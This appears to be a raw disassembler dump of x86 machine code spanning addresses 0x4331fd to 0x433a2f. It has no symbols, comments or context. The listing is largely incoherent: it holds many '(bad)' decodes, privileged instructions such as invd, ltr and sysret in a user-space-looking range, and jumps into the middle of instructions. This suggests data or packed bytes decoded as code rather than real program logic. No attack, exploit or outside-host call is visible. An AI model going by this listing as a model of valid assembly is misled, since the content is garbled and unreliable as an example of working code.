  4331fd:	idiv   BYTE PTR [ecx]
  4331ff:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433206:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43320c:	add    BYTE PTR [ecx+0x66],dh
  43320f:	add    eax,DWORD PTR [ebp+0x52]
  433212:	adc    eax,0x20
  433215:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43321b:	test   DWORD PTR [eax],eax
  43321d:	clc    
  43321e:	data16 or al,BYTE PTR [ebp+0x45]
  433222:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  433229:	rol    BYTE PTR [ebp+0x45],1
  43322c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  433232:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  433238:	push   ebx
  433239:	add    BYTE PTR [ecx+0x0],dl
  43323c:	push   ecx
  43323d:	jge    0x433272
  43323f:	add    BYTE PTR [esi+0x4],dl
  433242:	jne    0x4332a9
  433244:	mov    edx,0x457200
  433249:	jmp    0x43320d
  43324b:	xor    edi,DWORD PTR [ebx]
  43324d:	pop    edi
  43324e:	cvtdq2ps xmm7,xmm0
  433251:	ret    0x0
  433254:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43325a:	xor    ecx,DWORD PTR [edi]
  43325c:	add    eax,DWORD PTR [ecx+0x3b]
  43325f:	push   ebx
  433260:	rdpmc  
  433262:	out    0x8d,al
  433264:	add    BYTE PTR [eax],cl
  433266:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43326c:	ret    0x450c
  43326f:	sbb    al,0x8b
  433271:	cmp    eax,esi
  433273:	or     cl,al
  433275:	or     al,0xc2
  433277:	pop    eax
  433278:	inc    ebp
  433279:	add    ecx,DWORD PTR [edi]
  43327b:	add    esi,DWORD PTR [ebp+0x39]
  43327e:	invd   
  433280:	jge    0x43328c
  433282:	mov    eax,0x478ac0
  433287:	cli    
  433288:	xor    esp,ecx
  43328a:	mov    ebx,0x5b8ac0
  43328f:	ret    0x33
  433292:	mov    eax,0x833a8b
  433297:	sub    BYTE PTR [ebx],al
  433299:	inc    ebp
  43329a:	data16 ss clc 
  43329d:	pushf  
  43329e:	inc    bh
  4332a0:	mov    esp,esp
  4332a2:	hlt    
  4332a3:	test   DWORD PTR [ebp-0x8],esi
  4332a6:	mov    eax,DWORD PTR [ebp-0x14]
  4332a9:	cmp    BYTE PTR [ebx-0x76478864],cl
  4332af:	dec    edi
  4332b0:	or     BYTE PTR [eax],al
  4332b2:	jne    0x43323d
  4332b4:	mov    esi,esp
  4332b6:	call   0x77a9be7b
  4332bb:	inc    ebp
  4332bc:	mov    DWORD PTR [eax+0x994f0c],edi
  4332c2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4332c8:	add    BYTE PTR [esi+0x7d],ah
  4332cb:	inc    ebp
  4332cc:	mov    bx,WORD PTR [ebp+0x8]
  4332d0:	add    DWORD PTR [ebp+0x51],0x30c008b
  4332d7:	inc    ebp
  4332d8:	mov    bx,di
  4332db:	lock test BYTE PTR [ecx+0x7000801],bh
  4332e2:	jge    0x4332a5
  4332e4:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  4332ea:	cli    
  4332eb:	xor    bl,bh
  4332ed:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4332f3:	test   BYTE PTR [eax],cl
  4332f5:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4332fc:	cmp    ebp,eax
  4332fe:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433305:	test   BYTE PTR [ebp+0x1],bh
  433308:	mov    ebx,0x458a00
  43330d:	xor    esi,DWORD PTR [ebx]
  43330f:	add    esp,DWORD PTR [esi-0x77]
  433312:	pop    ebp
  433313:	loopne 0x43337b
  433315:	inc    ebp
  433316:	clc    
  433317:	xor    edi,DWORD PTR [ebx]
  433319:	add    esi,DWORD PTR [edx-0x77]
  43331c:	data16 fdivr QWORD PTR [ebp-0x49]
  433320:	mov    ebx,0xb78afc
  433325:	hlt    
  433326:	xor    edi,DWORD PTR [eax]
  433328:	data16 add BYTE PTR [ebp+0x66],bl
  43332c:	data16 lock clc 
  43332f:	cmp    BYTE PTR [ebx],bh
  433331:	add    BYTE PTR [edi+0x66],dh
  433334:	psubq  mm7,QWORD PTR [ebp-0x2]
  433338:	ltr    WORD PTR [ebp+0x66]
  43333c:	add    esi,eax
  43333e:	add    di,WORD PTR [ebp+0x2b]
  433342:	data16 data16 jge 0x4333c3
  433346:	mov    ebx,0xe08a8b
  43334b:	jge    0x433380
  43334d:	data16 data16 xor al,0x5d
  433351:	data16 data16 jne 0x43334d
  433355:	mov    edi,DWORD PTR [ebx]
  433357:	fdiv   QWORD PTR [edx+0x7d]
  43335a:	data16 data16 jge 0x433392
  43335e:	mov    ebx,0x758a66
  433363:	mov    esi,0x667233
  433368:	pop    ebp
  433369:	or     BYTE PTR [esi+0x0],ah
  43336c:	clc    
  43336d:	mov    edi,DWORD PTR [ebx]
  43336f:	lock ja 0x4332fd
  433372:	(bad)  
  433374:	jge    0x43336d
  433376:	invd   
  433378:	pop    ebp
  433379:	add    BYTE PTR [ebx],al
  43337b:	(bad)  
  43337c:	cmp    di,WORD PTR [ebp+0xf]
  433380:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433384:	mov    bx,WORD PTR [ebp-0x10]
  433388:	pop    bp
  43338a:	fbstp  TBYTE PTR [ebx]
  43338c:	test   DWORD PTR [ebx],eax
  43338e:	add    BYTE PTR [ebx],bh
  433390:	add    BYTE PTR [esi+0x7d],ah
  433393:	jge    0x433320
  433395:	data16 in al,dx
  433397:	pop    ebp
  433398:	stc    
  433399:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  4333a0:	mov    edi,ebx
  4333a2:	in     al,dx
  4333a3:	test   BYTE PTR [ebp+0x0],bh
  4333a6:	mov    eax,DWORD PTR [eax]
  4333a8:	call   0xbd402d38
  4333ad:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  4333b3:	sti    
  4333b4:	call   0x8b4bb144
  4333b9:	add    ebp,esp
  4333bb:	mov    bx,di
  4333be:	jnp    0x4333e6
  4333c0:	mov    DWORD PTR [ebx+0x387df808],ecx
  4333c6:	mov    eax,DWORD PTR [eax]
  4333c8:	call   0x7c3ebf33
  4333cd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4333d3:	data16 data16 fistp WORD PTR [ebp+0xe]
  4333d8:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  4333e2:	fisttp WORD PTR [ecx-0x7401f77b]
  4333e8:	(bad)  
  4333e9:	cld    
  4333ea:	jne    0x433424
  4333ec:	xor    eax,DWORD PTR [eax]
  4333ee:	mov    esp,DWORD PTR [esi-0x10]
  4333f1:	sti    
  4333f2:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4333f9:	data16 adc bl,bh
  4333fc:	push   ebp
  4333fd:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433404:	mov    WORD PTR [eax],es
  433406:	cdq    
  433407:	data16 xor bh,bl
  43340a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433410:	mov    esp,DWORD PTR [esi-0x14]
  433413:	fisttp WORD PTR [ebx-0x3748a9f2]
  433419:	or     al,0x2b
  43341b:	mov    bh,0xba
  43341d:	hlt    
  43341e:	mov    bh,bl
  433420:	add    BYTE PTR [ecx-0x7446f3cd],cl
  433426:	dec    edi
  433427:	or     al,0x0
  433429:	mov    edi,DWORD PTR [ebx]
  43342b:	or     BYTE PTR [ebp+0x3b],dh
  43342e:	mov    ecx,DWORD PTR [edi]
  433430:	fdivr  QWORD PTR [ebx-0x7499ff83]
  433436:	xor    al,0xd8
  433438:	pop    bp
  43343a:	lock xor esi,DWORD PTR [ebx]
  43343d:	lea    esp,[esi+0x1f]
  433440:	icebp  
  433441:	jb     0x433447
  433443:	add    al,al
  433445:	jge    0x433453
  433447:	mov    eax,eax
  433449:	fsubr  st,st(3)
  43344b:	pop    ebp
  43344c:	mov    esi,DWORD PTR [ebx]
  43344e:	in     al,0x8d
  433450:	rcr    DWORD PTR [edi],0xc2
  433453:	jb     0x4334b3
  433455:	add    cl,cl
  433457:	jge    0x433465
  433459:	mov    edx,DWORD PTR [ebp-0x20]
  43345c:	in     al,dx
  43345d:	pop    ebp
  43345e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  433463:	data16 cmp bh,BYTE PTR [ebp+0x0]
  433467:	mov    ebp,DWORD PTR [ebx]
  433469:	fdivr  QWORD PTR [esi+0x668a5d]
  43346f:	cmp    al,0x33
  433471:	mov    si,0x4f7d
  433475:	mov    eax,DWORD PTR [eax]
  433477:	lock inc ebp
  433479:	mov    esi,DWORD PTR [edi]
  43347b:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433482:	clc    
  433483:	(bad)  
  433484:	cmp    edi,DWORD PTR [ebx]
  433486:	je     0x433497
  433488:	push   ebx
  433489:	loopne 0x43349a
  43348b:	dec    ecx
  43348d:	mov    esp,DWORD PTR [edi-0x1c]
  433490:	int    0xf1
  433492:	mov    esi,0x703084d
  433497:	pcmpgtd mm6,mm1
  43349a:	add    BYTE PTR [ebp+0x66],dh
  43349d:	jmp    0x43346a
  43349f:	mov    eax,DWORD PTR [ebx]
  4334a1:	lock push ebp
  4334a3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4334a9:	or     bh,dl
  4334ab:	jb     0x4334ab
  4334ad:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4334b3:	loopne 0x4334b5
  4334b5:	jne    0x4334b5
  4334b7:	data16 add BYTE PTR [esi+eiz*2],dh
  4334bb:	mov    ecx,ebx
  4334bd:	data16 cmp cl,dh
  4334c0:	add    BYTE PTR [eax],bh
  4334c2:	data16 add bl,cl
  4334c5:	data16 cmp dh,dl
  4334c8:	add    BYTE PTR [edx],bh
  4334ca:	data16 add bl,cl
  4334cd:	enterw 0x4df1,0x19
  4334d2:	pop    edi
  4334d3:	jne    0x433456
  4334d5:	mov    esi,DWORD PTR [edi]
  4334d7:	call   0x77b7c078
  4334dc:	xor    ebp,DWORD PTR [ebx]
  4334de:	lea    esp,[esi+0x48]
  4334e1:	repnz in eax,0x3b
  4334e4:	add    BYTE PTR [ebp-0x37],dh
  4334e7:	xor    edx,DWORD PTR [ebp-0x15]
  4334ea:	in     al,dx
  4334eb:	xor    edx,DWORD PTR [esi+0x40]
  4334ee:	mov    DWORD PTR [edi],0x338545fc
  4334f4:	clc    
  4334f5:	add    esi,DWORD PTR [esi]
  4334f7:	pop    edi
  4334f8:	pushf  
  4334f9:	pop    ebx
  4334fa:	call   0xff4434c1
  4334ff:	mov    edi,eax
  433501:	push   ecx
  433502:	pop    es
  433503:	mov    edi,DWORD PTR [edx]
  433505:	push   esi
  433506:	inc    esp
  433507:	(bad)  
  433508:	jle    0x43350a
  43350a:	popa   
  43350b:	data16 (bad) 
  43350d:	into   
  43350e:	addr16 cmp ch,cl
  433511:	add    BYTE PTR [ecx+0x7ce0866],bh
  433517:	cmp    ah,BYTE PTR [esi+0x0]
  43351a:	add    bh,al
  43351c:	(bad)  
  43351d:	cld    
  43351e:	add    BYTE PTR [ebp+0x36c3f866],al
  433524:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  43352b:	pop    ebp
  43352c:	or     BYTE PTR [edi+0x0],dl
  43352f:	mov    bh,0x66
  433531:	mov    edi,0xff038dc3
  433536:	jne    0x433589
  433538:	lea    edx,[ecx+0x1]
  43353b:	mov    ebx,0xd64ff1
  433540:	sar    DWORD PTR [ebx],1
  433542:	test   BYTE PTR [ebp+0x32],dh
  433545:	mov    DWORD PTR [esp+edi*8-0x76],esp
  433549:	push   edi
  43354a:	xor    BYTE PTR [ebx],0x3a
  43354d:	mov    esi,ebx
  43354f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  433555:	xor    al,BYTE PTR [ebp+0x64]
  433558:	pop    ebx
  433559:	mov    ebx,0x9c3a37
  43355e:	je     0x43358b
  433560:	xor    edi,DWORD PTR [ebx+0x668a33]
  433566:	mov    WORD PTR [ebx],?
  433568:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  43356e:	pop    edi
  43356f:	cmp    ecx,ecx
  433571:	jne    0x4335c8
  433573:	mov    ebp,esp
  433575:	cld    
  433576:	push   esi
  433577:	pop    ebx
  433578:	inc    ebp
  433579:	stc    
  43357a:	aaa    
  43357b:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433582:	clc    
  433583:	test   dl,dl
  433585:	xor    al,0xff
  433587:	fs pop si
  43358a:	or     bl,al
  43358c:	dec    BYTE PTR [ebx+0x57665100]
  433592:	retf   0x3845
  433595:	aaa    
  433596:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43359d:	clc    
  43359e:	add    BYTE PTR [ebx+0x66],bl
  4335a1:	dec    edx
  4335a3:	mov    edx,DWORD PTR [edi-0x76]
  4335a6:	push   edi
  4335a7:	add    al,0xb7
  4335a9:	xor    al,0xba
  4335ab:	cmp    al,0x8d
  4335ad:	je     0x4335ae
  4335af:	mov    edx,DWORD PTR [ecx-0x46]
  4335b2:	push   ecx
  4335b3:	lea    edi,[ebx+0x514fff]
  4335b9:	push   ecx
  4335ba:	cmp    edx,DWORD PTR [ebx+0x75]
  4335bd:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  4335c3:	add    BYTE PTR [ebx],dh
  4335c5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4335cb:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  4335d2:	mov    ebx,0x3b3a00
  4335d7:	jne    0x433604
  4335d9:	mov    DWORD PTR [ebx+0x728afc],edi
  4335df:	xor    esi,DWORD PTR [ebx]
  4335e1:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4335e7:	push   edi
  4335e8:	cmp    esp,ebp
  4335ea:	jne    0x4335ec
  4335ec:	sbb    DWORD PTR [eax],0x8085c3fc
  4335f2:	clc    
  4335f3:	inc    esp
  4335f4:	pop    ebx
  4335f5:	sti    
  4335f6:	add    eax,0xeb8bc075
  4335fb:	cld    
  4335fc:	xor    edi,DWORD PTR ds:0xf8c3855e
  433602:	mov    ecx,DWORD PTR [ecx+edx*2]
  433605:	rol    DWORD PTR [ebp-0x37],0xf
  433609:	mov    DWORD PTR [eax],ecx
  43360b:	inc    edi
  43360c:	(bad)  
  43360d:	in     eax,0x2
  43360f:	add    bh,bh
  433611:	(bad)  
  433612:	mov    esi,0xc38a5e
  433617:	mov    esi,DWORD PTR [ebx]
  433619:	push   ecx
  43361a:	mov    edi,0xfc4fc7
  43361f:	test   DWORD PTR [ebp-0x8],edx
  433622:	data16 ss (bad) 
  433625:	pushf  
  433626:	sub    ebp,eax
  433628:	inc    ebp
  433629:	(bad)  
  43362a:	sub    edi,edi
  43362c:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  433632:	inc    ebp
  433633:	add    BYTE PTR [esi+0x2b],ah
  433636:	or     bh,BYTE PTR [edx+0xf8ac2]
  43363c:	cmp    al,0x33
  43363e:	mov    edi,DWORD PTR [edx+0x24f81]
  433644:	(bad)  
  433645:	cmp    esi,DWORD PTR [ebx]
  433647:	je     0x433601
  433649:	push   ebx
  43364a:	dec    edi
  43364b:	str    ecx
  43364e:	cmp    esp,DWORD PTR [edi+0x75]
  433651:	int    0x33
  433653:	mov    edi,0x789085f
  433658:	mov    ecx,DWORD PTR [eax]
  43365a:	cld    
  43365b:	add    cl,cl
  43365d:	data16 add al,0xcb
  433660:	push   ebp
  433661:	add    ebp,esp
  433663:	jne    0x433651
  433665:	(bad)  
  433666:	mov    DWORD PTR [ecx],0xd685f7ec
  43366c:	clc    
  43366d:	xlat   BYTE PTR ds:[ebx]
  43366e:	inc    ebp
  43366f:	mov    edi,DWORD PTR [ecx]
  433671:	push   eax
  433672:	pushf  
  433673:	in     eax,0x8b
  433675:	add    ah,ch
  433677:	(bad)  
  433678:	push   ecx
  433679:	add    BYTE PTR [ecx+0x66],dl
  43367c:	add    eax,0x3872cb
  433681:	add    BYTE PTR [ebp+0x66],al
  433684:	(bad)  
  433685:	retf   
  433686:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43368d:	retf   
  43368e:	cmp    cl,al
  433690:	pushf  
  433691:	jge    0x43365a
  433693:	aaa    
  433694:	cld    
  433695:	pushf  
  433696:	test   DWORD PTR [edi-0x8],ebx
  433699:	je     0x4336e0
  43369b:	xor    esi,DWORD PTR ds:0x7020840
  4336a1:	ror    BYTE PTR [ebp-0x37],0x8d
  4336a5:	push   ebp
  4336a6:	add    esp,ebp
  4336a8:	jb     0x433635
  4336aa:	add    BYTE PTR [eax],cl
  4336ac:	dec    ebp
  4336ad:	mov    bh,0x81
  4336af:	push   esi
  4336b0:	push   ecx
  4336b1:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  4336b8:	xor    al,BYTE PTR [eax]
  4336ba:	mov    edx,DWORD PTR [edi+0x10]
  4336bd:	(bad)  
  4336be:	scas   eax,DWORD PTR es:[edi]
  4336bf:	cmp    bh,BYTE PTR [ebx]
  4336c1:	add    BYTE PTR [edi],cl
  4336c3:	mov    ebp,ebp
  4336c5:	cld    
  4336c6:	add    BYTE PTR [ebx],bh
  4336c8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4336cc:	dec    ebp
  4336cd:	or     BYTE PTR [ebx],ch
  4336cf:	ret    0x458b
  4336d2:	lock jmp 0x4336c6
  4336d5:	mov    ecx,DWORD PTR [eax]
  4336d7:	or     BYTE PTR [edi],al
  4336d9:	mov    ecx,eax
  4336db:	xor    DWORD PTR [edx+0x2],0x0
  4336df:	mov    bh,0xc1
  4336e1:	adc    BYTE PTR [eax],dh
  4336e3:	iret   
  4336e4:	inc    ebp
  4336e5:	mov    DWORD PTR [ebx],0x4dfff8c5
  4336eb:	inc    BYTE PTR [ebx]
  4336ed:	cmp    bh,al
  4336ef:	add    BYTE PTR [ecx],dl
  4336f1:	data16 adc al,bh
  4336f4:	dec    ecx
  4336f5:	fisttp WORD PTR [ecx+0x456604c0]
  4336fb:	add    dh,BYTE PTR ds:0x75e0845
  433701:	ret    0x4d
  433704:	lea    ecx,[ebx+0x18728301]
  43370a:	add    BYTE PTR [ebp+0x45],al
  43370d:	ss jmp 0x10a37af
  433713:	call   0xf8cebc5d
  433718:	clc    
  433719:	inc    ebp
  43371a:	shl    DWORD PTR ds:0x781084d,0x51
  433721:	cdq    
  433722:	push   ecx
  433723:	xor    al,BYTE PTR [ecx+0x32f89989]
  433729:	inc    ebp
  43372a:	cmp    edi,DWORD PTR [esi]
  43372c:	jbe    0x4336ca
  43372e:	mov    eax,edi
  433730:	or     ah,dh
  433732:	inc    ebp
  433733:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  433739:	cmp    BYTE PTR [ebx-0x74747664],cl
  43373f:	in     al,dx
  433740:	hlt    
  433741:	push   ecx
  433742:	push   ecx
  433743:	push   ecx
  433744:	push   ecx
  433745:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43374b:	cdq    
  43374c:	cdq    
  43374d:	xor    dh,BYTE PTR [edx]
  43374f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  433755:	or     BYTE PTR [ebp+0x7],al
  433758:	mov    eax,ecx
  43375a:	clc    
  43375b:	jb     0x43371e
  43375d:	add    BYTE PTR [ebp+0x55],cl
  433760:	or     DWORD PTR [edi],0xc251d151
  433766:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  433770:	mov    edi,eax
  433772:	or     cl,al
  433774:	inc    ebp
  433775:	dec    ebp
  433776:	mov    eax,DWORD PTR [ecx+0x514d510c]
  43377c:	or     WORD PTR [ecx],0x8999
  433781:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433787:	mov    edx,DWORD PTR [ecx+0x8]
  43378a:	mov    eax,DWORD PTR [ebp-0x8]
  43378d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433794:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43379a:	inc    ebp
  43379b:	dec    eax
  43379c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  4337a2:	add    edx,DWORD PTR [ecx-0x8]
  4337a5:	mov    ecx,DWORD PTR [ecx]
  4337a7:	clc    
  4337a8:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  4337af:	mov    ecx,ebp
  4337b1:	clc    
  4337b2:	(bad)  
  4337b3:	popf   
  4337b4:	inc    DWORD PTR [eax]
  4337b6:	ret    0x8b
  4337b9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4337bf:	mov    edi,esp
  4337c1:	hlt    
  4337c2:	test   ecx,esi
  4337c4:	clc    
  4337c5:	or     BYTE PTR [ebp+0x7],al
  4337c8:	cmp    ecx,eax
  4337ca:	pushf  
  4337cb:	jb     0x433800
  4337cd:	add    BYTE PTR [eax-0x3f],al
  4337d0:	inc    eax
  4337d1:	daa    
  4337d2:	inc    ebp
  4337d3:	inc    ebp
  4337d4:	xor    eax,0x7f80803
  4337d9:	dec    ebp
  4337da:	cdq    
  4337db:	add    esi,DWORD PTR [edx]
  4337dd:	clc    
  4337de:	cmp    DWORD PTR [ecx],ecx
  4337e0:	or     al,0x8
  4337e2:	add    al,BYTE PTR [ebp+0x2c]
  4337e5:	xor    eax,0x7350845
  4337ea:	or     BYTE PTR [ebp+0x7],cl
  4337ed:	lea    ebx,[ecx-0x748dcdff]
  4337f3:	add    BYTE PTR [eax*2-0x74b21438],cl
  4337fa:	mov    edx,DWORD PTR [eax]
  4337fc:	cld    
  4337fd:	dec    ebp
  4337fe:	push   ecx
  4337ff:	sub    edx,DWORD PTR [ecx-0x75]
  433802:	add    eax,0xf172fc
  433807:	or     BYTE PTR [ebp+0x7],cl
  43380a:	add    eax,ecx
  43380c:	or     al,0x72
  43380e:	add    DWORD PTR [eax],eax
  433810:	mov    ebx,0x29c2c1
  433815:	inc    ebp
  433816:	mov    eax,DWORD PTR [ebx]
  433818:	cmp    eax,0x3004d1c
  43381e:	xbegin 0x66c8c418
  433824:	clc    
  433825:	or     BYTE PTR [ebp+0x45],al
  433828:	cmp    DWORD PTR ds:0x78b089c,esi
  43382e:	adc    BYTE PTR [ebp+0x45],cl
  433831:	lea    eax,[ebp+0x33727501]
  433837:	add    cl,ch
  433839:	inc    ebp
  43383a:	add    bl,ch
  43383c:	add    BYTE PTR [ebx+0x45850845],cl
  433842:	je     0x4337cf
  433844:	push   ebx
  433845:	or     al,0x85
  433847:	dec    ebp
  433848:	std    
  433849:	mov    bh,bh
  43384b:	mov    BYTE PTR [ebp-0x75],al
  43384e:	mov    edi,eax
  433850:	or     al,0x89
  433852:	inc    ebp
  433853:	clc    
  433854:	mov    esp,esp
  433856:	hlt    
  433857:	call   DWORD PTR [edi-0x37]
  43385a:	push   ecx
  43385b:	or     al,0x51
  43385d:	push   ebp
  43385e:	xor    ebp,esp
  433860:	mov    esi,0x457251
  433865:	ss (bad) 
  433867:	pushf  
  433868:	inc    ebp
  433869:	(bad)  
  43386a:	mov    edi,eax
  43386c:	or     al,0x85
  43386e:	add    al,bh
  433870:	inc    eax
  433872:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  433876:	or     ah,bh
  433878:	inc    eax
  433879:	push   ecx
  43387a:	jmp    0x4338cd
  43387c:	mov    eax,DWORD PTR ds:0xe8720c
  433882:	mov    DWORD PTR [ebp-0x8],eax
  433885:	jne    0x4338cc
  433887:	jmp    0x433814
  433889:	mov    ebp,DWORD PTR [eax]
  43388b:	clc    
  43388c:	retf   0xff51
  43388f:	push   ecx
  433890:	mov    DWORD PTR ds:0x757210,eax
  433896:	mov    ecx,DWORD PTR [ebp-0x4]
  433899:	sub    esp,DWORD PTR [ebx-0x77]
  43389c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4338a3:	or     ah,bh
  4338a5:	pop    es
  4338a6:	ds cdq 
  4338a8:	push   DWORD PTR [edx]
  4338aa:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4338b0:	(bad)  
  4338b1:	mov    bh,bh
  4338b3:	jmp    0x4338a1
  4338b5:	leave  
  4338b6:	jne    0x4338c0
  4338b8:	call   0x303212
  4338bd:	in     al,dx
  4338be:	dec    ebp
  4338bf:	add    dh,BYTE PTR [ebx]
  4338c1:	add    BYTE PTR [ebx],al
  4338c3:	inc    ebp
  4338c4:	cmp    esi,DWORD PTR [esi]
  4338c6:	je     0x433864
  4338c8:	mov    eax,edi
  4338ca:	or     al,0xf0
  4338cc:	add    BYTE PTR [ebp+0x458bf845],al
  4338d2:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4338d8:	adc    al,0x7
  4338da:	enter  0x9fc0,0xa5
  4338de:	rol    BYTE PTR [eax],0x5e
  4338e1:	mov    ecx,ecx
  4338e3:	or     al,0xc
  4338e5:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4338ec:	jmp    0x4338ed
  4338ee:	push   ebp
  4338ef:	mov    esp,ebp
  4338f1:	cld    
  4338f2:	inc    ebp
  4338f3:	inc    ebp
  4338f4:	or     DWORD PTR [ecx+0x457dec10],0x0
  4338fb:	push   esi
  4338fc:	push   esi
  4338fd:	mov    edi,0x7af080f
  433902:	add    bh,al
  433904:	test   DWORD PTR [ecx+0x3a7320f],ebx
  43390a:	add    BYTE PTR [ecx+0x4540100f],cl
  433910:	mov    ebp,eax
  433912:	mov    ebp,edi
  433914:	lock call edx
  433917:	fcom   DWORD PTR [ebp+0x45]
  43391a:	mov    eax,0x148a8b
  43391f:	push   ecx
  433920:	enter  0xc145,0x83
  433924:	cmp    cl,BYTE PTR [eax]
  433926:	add    BYTE PTR [ebp+0x4d],al
  433929:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  43392f:	call   0xffa3349e
  433934:	cmp    eax,DWORD PTR [ebp-0xc]
  433937:	jmp    DWORD PTR [eax+edx*1-0x4e]
  43393b:	push   ebp
  43393c:	(bad)
  43393f:	std    
  433940:	lock push DWORD PTR [edi+0x5d08fcdb]
  433947:	inc    ebp
  433948:	(bad)  
  433949:	call   0xff7d35d9
  43394e:	add    al,BYTE PTR [ebp+0x37]
  433951:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  433957:	jne    0x433959
  433959:	(bad)  
  43395a:	cmp    edi,esp
  43395c:	jne    0x43398f
  43395e:	mov    edi,edi
  433960:	or     BYTE PTR [ebx-0x307f0b49],cl
  433966:	pop    ds
  433967:	into   
  433968:	je     0x43392b
  43396a:	mov    ebx,DWORD PTR [esi]
  43396c:	or     BYTE PTR [ebp-0x49],al
  43396f:	mov    esp,DWORD PTR [esi-0x77]
  433972:	mov    esi,0xfe451f0c
  433977:	mov    eax,DWORD PTR [eax]
  433979:	or     al,0x66
  43397b:	sar    bl,0x3b
  43397e:	xor    esi,DWORD PTR [ebp+0x66]
  433981:	xor    ecx,edi
  433983:	pop    edi
  433984:	adc    bl,BYTE PTR [ebx+0x7e]
  433987:	ret    0xff
  43398a:	cld    
  43398b:	inc    ebp
  43398c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433992:	cld    
  433993:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  43399a:	push   0xffffff83
  43399c:	pop    edi
  43399d:	or     BYTE PTR [ebp+0x53],dh
  4339a0:	xorps  xmm1,xmm2
  4339a3:	test   BYTE PTR [eax+eax*1],bh
  4339a6:	add    BYTE PTR [eax],al
  4339a8:	adc    eax,eax
  4339aa:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4339b2:	jmp    DWORD PTR [eax]
  4339b4:	ror    al,0x5e
  4339b7:	inc    ebp
  4339b8:	leave  
  4339b9:	xor    ecx,DWORD PTR [eax]
  4339bb:	and    DWORD PTR [ebx-0x3ec70708],ecx
  4339c1:	add    ch,al
  4339c3:	xor    edi,edi
  4339c5:	xor    DWORD PTR [ebx],0x660033fe
  4339cb:	mov    DWORD PTR [ebp-0xc],ecx
  4339ce:	pcmpgtw mm0,mm0
  4339d1:	add    dl,ah
  4339d3:	leave  
  4339d4:	mov    edi,DWORD PTR [eax-0x7d]
  4339d7:	push   ax
  4339d9:	dec    ebp
  4339da:	mov    esi,DWORD PTR [ebx-0x75]
  4339dd:	lea    ebp,[eax-0x7c00fffe]
  4339e3:	xor    eax,DWORD PTR [eax]
  4339e5:	sysret 
  4339e7:	dec    ebp
  4339e8:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  4339ef:	push   WORD PTR [ecx+0x8]
  4339f3:	jne    0x4339b6
  4339f5:	ud0    ecx,DWORD PTR [ecx]
  4339f8:	mov    edi,DWORD PTR [edx]
  4339fa:	lods   al,BYTE PTR ds:[esi]
  4339fb:	add    BYTE PTR [eax],al
  4339fd:	data16 (bad) 
  4339ff:	iret   
  433a00:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433a07:	cli    
  433a08:	inc    ebp
  433a09:	cmp    al,0x8d
  433a0b:	add    BYTE PTR [esi+0x2d],ah
  433a0e:	inc    ebp
  433a0f:	pop    ebp
  433a10:	lea    ecx,[edi]
  433a12:	mov    dl,bh
  433a14:	add    BYTE PTR [edi],cl
  433a16:	mov    DWORD PTR [eax+eax*8],edi
  433a19:	mov    ebx,0x3a87
  433a1e:	add    BYTE PTR [ebx],ch
  433a20:	inc    ebp
  433a21:	data16 (bad) 
  433a23:	clc    
  433a24:	int3   
  433a25:	cmp    eax,DWORD PTR [eax]
  433a27:	je     0x4339b2
  433a29:	push   0xffffffc8
  433a2b:	pop    edi
  433a2c:	xchg   DWORD PTR [ebp+0x0],eax
  433a2f:	data16 add BYTE PTR [ebp+0x45],cl
